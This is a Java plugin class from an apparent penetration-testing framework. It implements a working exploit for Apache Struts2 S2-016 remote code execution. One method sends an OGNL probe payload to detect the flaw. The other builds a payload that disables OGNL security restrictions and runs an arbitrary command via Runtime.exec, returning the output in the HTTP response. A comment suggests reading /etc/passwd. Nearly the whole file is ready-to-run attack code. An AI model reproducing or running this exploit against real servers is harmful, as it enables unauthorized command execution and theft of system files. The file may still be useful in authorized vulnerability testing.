package com.orleven.tentacle.permeate.script;

import java.io.IOException;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.apache.http.ParseException;
import org.springframework.context.annotation.Scope;
import org.springframework.stereotype.Component;

import com.orleven.tentacle.core.IOC;
import com.orleven.tentacle.define.Message;
import com.orleven.tentacle.define.Permeate;
import com.orleven.tentacle.permeate.bean.ProveBean;
import com.orleven.tentacle.permeate.script.base.WebScriptBase;
import com.orleven.tentacle.util.WebUtil;

/**
 * Struts2 RCE 016
 * @author orleven
 * @date 2017年1月3日
 */
@Component
@Scope("prototype")
public class Struts2RCE016 extends WebScriptBase {
	
	
	public Struts2RCE016(){
		super();
	}
	
	@SuppressWarnings("deprecation")
	@Override
	public void prove() {
		ProveBean proveBean= IOC.instance().getClassobj(ProveBean.class);
		String provePayload = "redirect:${#w=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),#w.println('The Struts2-016 Remote Code Execution Is Exist!'),#w.flush(),#w.close()}";
		String proveFlag = "The Struts2-016 Remote Code Execution Is Exist!";
		String result = "";
		try {
			result = WebUtil.getResponseBody(WebUtil.httpPost(getTargetUrl(), getHttpHeaders(),URLEncoder.encode(provePayload).replace("+","%20")));
			if (result!=null&&result.indexOf(proveFlag)>=0) {
				getVulnerBean().setIsVulner(Permeate.isVulner);
			}else{
				getVulnerBean().setIsVulner(Permeate.isNotVulner);
			}
		} catch (ParseException e) {
			result = Message.notAvailable;
			getVulnerBean().setIsVulner(Permeate.isNotVerified);
			e.printStackTrace();
		} catch (IOException e) {
			result = Message.notAvailable;
			getVulnerBean().setIsVulner(Permeate.isNotVerified);
			e.printStackTrace();
		} finally{
			proveBean.setReceiveMessage(result);
			proveBean.setSendMessage(provePayload);
			getVulnerBean().getProveBean().add(proveBean);
		}
	}

	/**
	 * command 的格式： 'id'或者'cat','/etc/passwd';
	 */
	@Override
	public void execCommand(String command) {
		String execPayload1 = "redirect:${#context['xwork.MethodAccessor.denyMethodExecution']=false,#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=@java.lang.Runtime@getRuntime().exec('";
		String execPayload2 = "').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#genxor=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),#genxor.println(#d),#genxor.flush(),#genxor.close()}";
		ProveBean proveBean= IOC.instance().getClassobj(ProveBean.class);
		String result = "";
		try {
			result = WebUtil.getResponseBody(WebUtil.httpPost(getTargetUrl(), getHttpHeaders(),URLEncoder.encode(execPayload1+ command +execPayload2,"UTF-8").replace("+","%20")));
			if(result!=null){
				result = result.substring(result.indexOf(result));
			}
		} catch (ParseException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		} finally{
			proveBean.setReceiveMessage(result);
			proveBean.setSendMessage(command);
			getVulnerBean().getProveBean().add(proveBean);
		}
	}
	

}
